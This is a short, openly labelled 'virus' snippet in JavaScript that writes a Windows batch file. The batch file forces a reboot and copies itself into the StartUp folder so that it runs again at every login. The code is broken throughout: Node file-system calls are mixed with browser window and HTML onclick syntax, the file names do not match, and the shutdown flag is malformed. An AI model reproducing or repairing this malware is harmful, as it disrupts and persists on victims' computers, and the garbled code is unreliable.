const fs = require("fs")
let virus = '@echo off\n' +
'shutdown - r -t 10\n' +
'copy /y virusfile.bat "%windir%\\Start Menu\\Programs\\StartUp"';
fs.writeFile("Shutdown.bat", virus, (err) => { 
if (err) throw err; 
function openfile(file) { window.location = "file:///" + virusfile.bat; }
onclick="openfile(this.value)"
})
